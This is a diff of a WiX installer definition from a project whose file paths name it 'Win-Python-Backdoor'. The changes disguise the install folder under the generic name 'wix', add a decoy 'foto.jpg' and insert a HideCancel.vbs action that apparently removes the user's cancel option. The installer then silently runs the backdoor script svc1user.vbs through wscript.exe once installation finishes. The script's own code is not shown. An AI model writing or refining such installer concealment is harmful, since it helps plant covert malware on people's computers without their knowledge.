@@ -9,23 +9,35 @@
 <Directory Id = 'TARGETDIR' Name = 'SourceDir'>
 <Directory Id = "DesktopFolder" Name = "Desktop"/>
 <Directory Id = 'LocalAppDataFolder'>
-<Directory Id = 'INSTALLDIR' Name = 'wix wix'>
+<Directory Id = 'INSTALLDIR' Name = 'wix'>
 </Directory>
 </Directory>
 </Directory>
 <DirectoryRef Id = 'INSTALLDIR'>
 <Component Win64 = "yes" Id = 'MainScript' Guid = '{FC96E7D0-B822-4EA6-8631-73C983696889}'>
-<File Id = 'vbs_id' Name = 'svc1user.vbs' DiskId = '1' Source = 'C:\Users\Francesco\Documents\GitHub\Win-Python-Backdoor\svc1user.vbs' KeyPath = 'no' />  
+  
+<File Id = 'vbs_id' Name = 'svc1user.vbs' DiskId = '1' Source = 'C:\Users\Francesco\Documents\GitHub\Win-Python-Backdoor\svc1user.vbs' KeyPath = 'no' />
+<File Id = 'foto_id' Name = 'foto.jpg' DiskId = '1' Source = 'C:\Users\Francesco\Documents\GitHub\Win-Python-Backdoor\foto.jpg' KeyPath = 'no' />
+   
   <RegistryValue Root = "HKCU" Key = "Software\wix\wix" Name = "installed" Type = "integer" Value = "1" KeyPath = 'yes' />
 <RemoveFolder Id = "CleanUpMainFolder" On="uninstall" />
 </Component>
 </DirectoryRef>
-<CustomAction Id='StartProgram' Directory='INSTALLDIR' Return='asyncNoWait' ExeCommand='&quot;[SystemFolder32]wscript.exe&quot; &quot;[INSTALLDIR]svc1user.vbs&quot;' />
+  <Binary Id='HideCancel.vbs' SourceFile='C:\Users\Francesco\Documents\GitHub\Win-Python-Backdoor\HideCancel.vbs' />
+  <CustomAction Id='HideCancel.vbs' VBScriptCall='' BinaryKey='HideCancel.vbs'
+                Execute='immediate' Return='ignore'/>
+  <CustomAction Id='StartProgram' Directory='INSTALLDIR' Return='asyncNoWait' ExeCommand='&quot;[SystemFolder32]wscript.exe&quot; &quot;[INSTALLDIR]svc1user.vbs&quot;' />
 <Feature Id = 'Complete' Level = '1'>
 <ComponentRef Id = 'MainScript' />
 </Feature>
+  <InstallUISequence>
+    <Custom Action='HideCancel.vbs' Before='AppSearch' />
+  </InstallUISequence>
 <InstallExecuteSequence>
-<Custom Action='StartProgram' After='InstallFinalize'>(REMOVE=&quot;&quot;)</Custom>
+  <Custom Action='HideCancel.vbs' Before='AppSearch' />
+ <Custom Action='StartProgram' After='InstallFinalize'>(REMOVE=&quot;&quot;)
+</Custom>
+  
 </InstallExecuteSequence>
 </Product>
 </Wix>
